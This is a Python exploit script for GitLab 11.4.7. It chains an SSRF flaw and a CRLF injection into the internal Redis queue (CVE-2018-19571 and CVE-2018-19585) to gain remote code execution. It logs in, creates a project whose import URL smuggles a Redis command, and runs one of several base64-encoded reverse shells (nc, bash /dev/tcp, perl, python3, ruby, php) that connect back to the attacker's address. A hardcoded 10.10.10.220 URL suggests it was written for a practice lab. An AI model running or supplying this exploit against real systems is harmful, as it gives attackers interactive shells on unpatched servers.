#!/usr/bin/python3

# Script by @algafix
# Simplications and changes for learning purposes.

# Based on the version from: Sam Redmond, Tam Lai Yin
# https://github.com/ctrlsam/GitLab-11.4.7-RCE

# CVE: CVE-2018-19571 + CVE-2018-19585

from random import randint
from argparse import RawTextHelpFormatter
import requests
import argparse
import base64
import re

########## GENERAL CONFIG ###########

parser = argparse.ArgumentParser(description='GitLab 11.4.7 RCE', formatter_class=RawTextHelpFormatter)
parser.add_argument('-u', help='GitLab Username/Email', required=True)
parser.add_argument('-p', help='Gitlab Password', required=True)
parser.add_argument('-g', help='Gitlab URL (without port)', required=True)
parser.add_argument('-l', help='Reverse shell ip', required=True)
parser.add_argument('-P', help='Reverse shell port', required=True)
parser.add_argument('L', metavar='lang', nargs='?', help='Language for the reverse shell. Default nc_e\nSupported: nc_e, bash, perl, python3, ruby, php')
args = parser.parse_args()

user = args.u
pwd = args.p
url = args.g + ":5080"
local_ip = args.l
local_port = args.P
shell_lang = ('nc_e' if args.L == None else args.L)

auth_token_regex = re.compile(r'name="authenticity_token" value="(.*)" />')
namespace_id_regex = re.compile(r'<input value="(.*)" type="hidden" name="project\[namespace_id\]"')


######## PAYLOAD FUNCTIONS ########

payloads_dict = {

    'nc_e': {
        'safe': True,
        'raw_payload': 'nc -e /bin/bash {local_ip} {local_port}'
    },

    'bash': {
        'safe': False,
        'raw_payload': 'bash -i >& /dev/tcp/{local_ip}/{local_port} 0>&1',
        'exec_string': 'echo {payload} | base64 -d | /bin/bash'
    },

    'php': {
        'safe': False,
        'raw_payload': '$sock=fsockopen("{local_ip}",{local_port});$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);',
        'exec_string': 'echo {payload} | base64 -d | php'
    },

    'perl': {
        'safe': False,
        'raw_payload': 'use Socket;$i="{local_ip}";$p={local_port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};',
        'exec_string': 'echo {payload} | base64 -d | perl'
    },

    'python3': {
        'safe': False,
        'raw_payload': 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{local_ip}",{local_port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);',
        'exec_string': 'echo {payload} | base64 -d | python3'
    },

    'ruby': {
        'safe': False,
        'raw_payload': 'exit if fork;c=TCPSocket.new("{local_ip}",{local_port});loop{{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){{|io|c.print io.read}}))rescue c.puts "failed: #{{$_}}"}}',
        'exec_string': 'echo {payload} | base64 -d | ruby -rsocket'
    },
}

def url_encode(b64_String):
    return b64_String.replace('=', '%3D').replace('+', '%2B')

def get_payload(language):

    try:
        payload_dict = payloads_dict[language]
    except KeyError:
        exit(f"[-] No shell defined for language {language}")

    if payload_dict['safe'] == True:
        payload = payload_dict['raw_payload'].format(local_ip=local_ip, local_port=local_port)
    else:
        raw_payload = payload_dict['raw_payload'].format(local_ip=local_ip, local_port=local_port)
        base64_payload = base64.b64encode(raw_payload.encode()).decode()
        base64_payload = url_encode(base64_payload)
        payload = payload_dict['exec_string'].format(payload=base64_payload)

    return payload


############## LOGIN ################

request = requests.Session()
url_login = url + '/users/sign_in'
login_page = request.get(url_login)

auth_token = re.findall(auth_token_regex, login_page.text)[0]

login_data = {
    'authenticity_token':   auth_token,
    'user[login]':          user,
    'user[password]':       pwd,
    'user[remember_me]':    0
}

login_post = request.post(url_login, data=login_data)

if login_post.status_code != 200:
    exit(f"[-] Login general error: {url_login}")
elif "Invalid Login" in login_post.text:
    exit(f"[-] Login error: {user} / {pwd}")

print("[+] Login successful.")


############ PROJECT CREATION AND EXPLOIT #########

url_project = url + '/projects'
url_new_project = 'http://10.10.10.220:5080/projects/new'
project_page = request.get(url_new_project)
project_name = "project" + str(randint(1000,9999))
namespace_id = re.findall(namespace_id_regex, project_page.text)[-1]

auth_token = re.findall(auth_token_regex, project_page.text)[-1]
auth_token = url_encode(auth_token)

print(f'[+] Creating payload in {shell_lang}')

payload = get_payload(shell_lang)

exploit_form = \
"""utf8=%E2%9C%93&authenticity_token=""" + auth_token + """&project%5Bimport_url%5D=git://[0:0:0:0:0:ffff:127.0.0.1]:6379/

 multi

 sadd resque:gitlab:queues system_hook_push

 lpush resque:gitlab:queue:system_hook_push "{\\"class\\":\\"GitlabShellWorker\\",\\"args\\":[\\"class_eval\\",\\"open(\\'|"""+ payload +"""\\').read\\"],\\"retry\\":3,\\"queue\\":\\"system_hook_push\\",\\"jid\\":\\"ad52abc5641173e217eb2e52\\",\\"created_at\\":1513714403.8122594,\\"enqueued_at\\":1513714403.8129568}"
 
 exec

 exec

/ssrf.git&project%5Bci_cd_only%5D=false&project%5Bname%5D="""+ project_name +"""&project%5Bnamespace_id%5D="""+ namespace_id +"""&project%5Bpath%5D="""+ project_name +"""&project%5Bdescription%5D=&project%5Bvisibility_level%5D=0"""

project_post = request.post(url_project, data=exploit_form, verify=False)

if project_post.status_code != 200:
    exit("[-] Problem in the project creation.")

print("[+] Payload sent.")

